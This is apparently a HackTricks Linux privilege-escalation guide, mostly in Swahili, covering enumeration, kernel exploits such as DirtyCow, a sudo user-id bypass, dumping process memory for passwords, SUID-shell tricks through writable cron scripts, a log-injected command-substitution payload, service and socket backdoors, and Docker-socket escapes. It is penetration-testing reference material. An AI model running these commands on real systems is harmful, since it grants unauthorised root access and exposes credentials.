# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Hebu tuanze kupata taarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa **una ruhusa za kuandika kwenye folda yoyote ndani ya `PATH`**, unaweza kuwa na uwezo wa hijack baadhi ya libraries or binaries:
```bash
echo $PATH
```
### Taarifa za mazingira

Je, kuna taarifa za kuvutia, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit ambayo inaweza kutumika ku-escalate privileges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernels zilizo hatarini na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel zilizo hatarini kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha ndani ya victim, hukagua tu exploits za kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**, labda toleo la kernel lako limeandikwa katika exploit fulani ya kernel na hivyo utakuwa na uhakika kwamba exploit hiyo inafanya kazi.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na toleo za sudo zilizo na udhaifu zinazoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii inavyoweza ku-exploited
```bash
dmesg 2>/dev/null | grep "signature"
```
### Kukusanya taarifa zaidi za mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka ndani yake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa chochote kime-unmounted unaweza kujaribu ku-mount na kukagua taarifa binafsi.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **any compiler is installed**. Hii ni muhimu ikiwa unahitaji kutumia baadhi ya kernel exploit, kwani inashauriwa compile it kwenye mashine utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Imewekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) that could be exploited for escalating privileges…\
Inashauriwa kukagua kwa mkono toleo la programu zilizowekwa ambazo zinaonekana kuwa za kutiliwa shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kuangalia programu zilizo za zamani na zilizo hatarini zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa na maana, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au nyingine zinazofanana zitakazokagua kama toleo lolote la programu iliyosakinishwa linaloweza kuwa dhaifu kwa exploits zilizojulikana_

## Michakato

Angalia **michakato gani** inaendeshwa na ukague kama kuna mchakato wowote unao **uruhusa zaidi kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** inavibaini kwa kukagua vigezo vya `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia **kagua ruhusa zako kwenye binaries za mchakato**, labda unaweza kuandika juu ya faili za wengine.

### Process monitoring

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato dhaifu inayotekelezwa mara kwa mara au wakati seti ya masharti yanatimizwa.

### Process memory

Baadhi ya huduma za server huhifadhi **nywila na vitambulisho kwa maandishi wazi ndani ya kumbukumbu**.\
Kwa kawaida utahitaji **root privileges** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, hivyo hii kwa kawaida ni muhimu zaidi unapokuwa tayari root na unataka kugundua nywila/vitambulisho zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

> [!WARNING]
> Kumbuka kwamba kwa sasa mashine nyingi **haziruhusu ptrace kwa chaguo-msingi** jambo linalomaanisha huwezi kutupa dump ya michakato ya watumiaji wako wasio na ruhusa.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kudebugiwa, mradi tu zina uid sawa. Hii ndiyo njia ya jadi jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi tu anaweza kudebugiwa.
> - **kernel.yama.ptrace_scope = 2**: Ni admin peke yake ndiye anayeweza kutumia ptrace, kwani inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna mchakato unaoweza kufuatiliwa kwa ptrace. Ukichomwa hivi, inahitaji reboot ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake nywila/vitambulisho.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps zinaonyesha jinsi kumbukumbu imepangwa ndani ya nafasi ya anwani pepe ya mchakato huo;** pia inaonyesha **idhini za kila eneo lililopangwa**. Faili ya pseudo **mem** **inafunua kumbukumbu ya mchakato yenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **mikoa ya kumbukumbu inayosomeka** na ofseti zao. Tunatumia taarifa hii **kuingia kwenye faili ya mem na kuandika maeneo yote yanayosomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikaji kwa kumbukumbu ya **kimwili** ya mfumo, sio kumbukumbu ya virtual. Nafasi ya anwani ya virtual ya kernel inaweza kupatikana kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inasomwa tu na **root** na kikundi cha kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux la zana ya klasiki ProcDump kutoka kwenye suite ya zana za Sysinternals za Windows. Pata hapa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Ili dump a process memory unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kwa mkono kuondoa mahitaji ya root na dump process inayomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Vyeti kutoka Process Memory

#### Mfano la mkono

Ikiwa unagundua kuwa mchakato wa authenticator unaendelea kukimbia:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump process (angalia sehemu za awali ili kupata njia tofauti za dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitapora **alama za kuingia za maandishi wazi kutoka kwenye kumbukumbu** na kutoka kwa baadhi ya **mafayela yanayojulikana**. Kinahitaji ruhusa za root ili kifanye kazi ipasavyo.

| Kipengele                                          | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zilizopangwa/Cron jobs

Angalia kama kuna Cron job yoyote yenye udhaifu. Labda unaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili zinazotumiwa na root? tumia symlinks? unda faili maalum katika directory inayotumiwa na root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika kwenye /home/user_)

Iwapo ndani ya crontab hii mtumiaji root atajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron inavyotumia script yenye wildcard (Wildcard Injection)

Iwapo script inatekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa mbele ya path kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma field za log zisizo salama na kuziingiza kwenye muktadha wa arithmetic, mshambuliaji anaweza kuingiza command substitution $(...) ambayo itaendeshwa kama root wakati cron inapokimbia.

- Kwanini inafanya kazi: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Kwa hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inabadilishwa (ikiendesha amri), kisha `0` ya nambari inayobaki inatumiwa kwa arithmetic ili script iendelee bila makosa.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Utekelezaji: Pata maandishi yanayodhibitiwa na mshambuliaji yaliandikwe kwenye log inayochambuliwa ili uwanja unaoonekana kama nambari uwe na command substitution na uishe kwa tarakimu. Hakikisha amri yako haisababishi uchapishaji kwenye stdout (au uielekeze) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa ya manufaa kufuta folder hiyo na **kuunda symlink folder kuelekea nyingine** inayohudumia script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Jobs za cron zinazojirudia mara kwa mara

Unaweza kufuatilia michakato ili kutafuta michakato zinazotekelezwa kila dakika 1, 2 au 5. Labda unaweza kulitumia kupata ruhusa za juu.

Kwa mfano, ili **fuatilia kila 0.1s kwa dakika 1**, **panga kwa amri zilizotekelezwa kidogo** na kufuta amri ambazo zimefanywa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila karakteri ya newline), na cron job itafanya kazi. Mfano (kumbuka karakteri ya carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Mafaili ya _.service_ yanayoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, **unaweza kuibadilisha** ili **itekeleze** backdoor yako wakati huduma **inapoanza**, **inapoanzishwa upya** au **inaposimama** (huenda utahitaji kusubiri hadi mashine ianzishwe upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya `.service` kwa **`ExecStart=/tmp/script.sh`**

### Mabinary za huduma yanayoweza kuandikwa

Kumbuka kwamba ikiwa una **write permissions over binaries being executed by services**, unaweza kuziibadilisha kwa backdoors ili wakati services zitakaporudi kutekelezwa backdoors zitatumika.

### systemd PATH - Njia za Kihusiano

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **write** katika yoyote ya folda za njia, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** katika faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, create an **executable** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**Jifunze zaidi kuhusu services kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yao yanamalizika kwa `**.timer**` ambazo zinadhibiti `**.service**` files au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada uliojengwa kwa ajili ya matukio ya kalenda na matukio ya monotonic time, na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> Unit itakayowashwa wakati timer hii inapomalizika. Hoja ni jina la unit, ambalo uambatisho wake si ".timer". Ikiwa haijatajwa, thamani hii kwa kawaida itakuwa service ambayo ina jina sawa na timer unit, isipokuwa kwa uambatisho. (Angalia hapo juu.) Inapendekezwa kwamba jina la unit litakalowashwa na jina la unit ya timer viwe vimepewa majina sawa, isipokuwa kwa uambatisho.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Pata unit ya systemd (kama a `.service`) ambayo inayo **endesha binary inayoweza kuandikwa**
- Pata unit ya systemd ambayo inayo **endesha a relative path** na una **writable privileges** juu ya **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** ina **wezeshwa** kwa kuunda symlink kwenda kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano ya mchakato** kwenye mashine moja au tofauti ndani ya mifano ya client-server. Zinatumia faili za descriptor za Unix za kawaida kwa mawasiliano kati ya kompyuta na zinaundwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets kwa `man systemd.socket`.** Ndani ya faili hili, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini kwa kifupi zinatumika kuonyesha **mahali ambapo itasikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au namba ya bandari kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **mfano wa service huzalishwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndio hupitishwa kwake. Ikiwa **false**, sockets zote zinazolisikilizwa wenyewe **hutumwa kwa service unit iliyowashwa**, na service unit moja tu huzalishwa kwa muunganisho yote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo service unit moja bila sharti inashughulikia trafiki yote inayoingia. **Chaguo-msingi ni false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri moja au zaidi, ambazo zinafanywa **kabla** au **baada** socket/FIFO zinazolisikilizwa zina **undwa** na kufungwa (bound), mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, kisha ifuatwe na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zinafanywa **kabla** au **baada** socket/FIFO zinazolisikilizwa zina **fungwa** na kuondolewa, mtawalia.
- `Service`: Inabainisha jina la unit ya **service** itakayowezeshwa kwenye **trafiki inayoingia**. Mipangilio hii inaruhusiwa tu kwa sockets zenye `Accept=no`. Chaguo-msingi ni service inayoshikilia jina lilelile kama socket (kwa kubadilisha suffix). Katika kesi nyingi, haitakuwa muhimu kutumia chaguo hili.

### Writable `.socket` files

Ikiwa utapata faili ya `.socket` inayoweza kuandikwa unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket iundwe. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine ianzishwe upya.**\
_Kumbuka kwamba mfumo lazima utumie usanidi wa faili ya socket hiyo au backdoor haitatekelezwa_

### Writable sockets

Ikiwa **utagundua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa Exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na **sockets listening for HTTP** requests (_Sina maana ya kuzungumzia .socket files bali faili zinazotumika kama unix sockets_). Unaweza kuangalia kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Kama socket **inapojibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Socket ya Docker inayoweza kuandikwa

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container ikiwa na root-level access kwenye filesystem ya host.

#### **Kutumia Docker API Moja kwa Moja**

Ikiwa Docker CLI haipatikani, Docker socket bado inaweza kutumiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi la kuunda container linalofunga directory ya root ya host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container mpya iliyoundwa:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Unganisha kwenye container: Tumia `socat` kuanzisha muunganisho kwa container, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na root-level access kwenye filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **ndani ya group `docker`** una [**njia zaidi za kuinua privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port** unaweza pia kuwa na uwezo wa kuikompromisa](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Tazama **njia zaidi za kutoroka kutoka docker au kuitumia vibaya kuinua privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa ugundua kwamba unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwani **unaweza kuitumia vibaya kuinua privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa ugundua kwamba unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwani **unaweza kuitumia vibaya kuinua privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa **inter-Process Communication (IPC)** ambao unawawezesha applications kuwasiliana na kushirikiana data kwa ufanisi. Imetengenezwa kwa ajili ya mfumo wa kisasa wa Linux, na hutoa mfumo imara wa aina mbalimbali za mawasiliano ya application.

Mfumo huo ni wa kimnada, ukisaidia IPC ya msingi ambayo inaboresha kubadilishana data kati ya processes, ikikumbusha kwa kiasi **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia katika kutangaza matukio au signals, kuimarisha muunganisho kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kusababisha music player kunyamaza, ikiboresha uzoefu wa mtumiaji. Aidha, D-Bus ina mfumo wa remote object, kurahisisha maombi ya service na invocation za method kati ya applications, kurahisisha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus inafanya kazi kwa mfano wa **allow/deny model**, ikisimamia ruhusa za ujumbe (kama method calls, signal emissions, n.k.) kulingana na athari ya jumla ya kufanana kwa sheria za sera. Sera hizi zinaelezea mwingiliano na bus, na zinaweza kuruhusu kuinuka kwa privileges kupitia udanganyifu wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa root user kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na mtumiaji au group maalum zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wale wote ambao hawajafunikwa na sera maalum nyingine.
```xml
<policy user="root">
